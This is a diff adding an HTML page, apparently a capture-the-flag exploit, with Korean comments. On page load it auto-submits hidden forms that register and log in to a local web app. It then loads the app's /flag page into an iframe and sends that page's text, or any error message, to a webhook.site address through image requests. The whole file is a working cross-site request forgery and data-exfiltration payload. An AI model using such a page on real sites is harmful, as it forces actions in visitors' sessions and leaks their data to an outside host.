@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<body>
+<iframe name="f1" id="f1"></iframe>
+<iframe name="f2" id="f2"></iframe>
+
+<form id="regForm" method="POST" action="http://localhost:3000/register" target="f1">
+  <input name="username" value="test99">
+  <input name="password" value="test99">
+</form>
+
+<form id="loginForm" method="POST" action="http://localhost:3000/login" target="f2">
+  <input name="username" value="test99">
+  <input name="password" value="test99">
+</form>
+
+<script>
+// register
+document.getElementById('regForm').submit();
+
+// login (register 직후)
+setTimeout(function(){
+  document.getElementById('loginForm').submit();
+}, 150);
+
+// f2에서 로그인 후 / 로 리다이렉트됨
+// 그 상태에서 f2를 /flag로 이동
+setTimeout(function(){
+  var f2 = document.getElementById('f2');
+  // form으로 /flag GET 요청
+  var flagForm = document.createElement('form');
+  flagForm.method = 'GET';
+  flagForm.action = 'http://localhost:3000/flag';
+  flagForm.target = 'f2';
+  document.body.appendChild(flagForm);
+  flagForm.submit();
+}, 400);
+
+setTimeout(function(){
+  try {
+    var c = document.getElementById('f2').contentDocument.body.innerText;
+    new Image().src = 'https://webhook.site/showontest?flag=' + encodeURIComponent(c);
+  } catch(e) {
+    new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message);
+  }
+}, 650);
+</script>
+</body>
+</html>
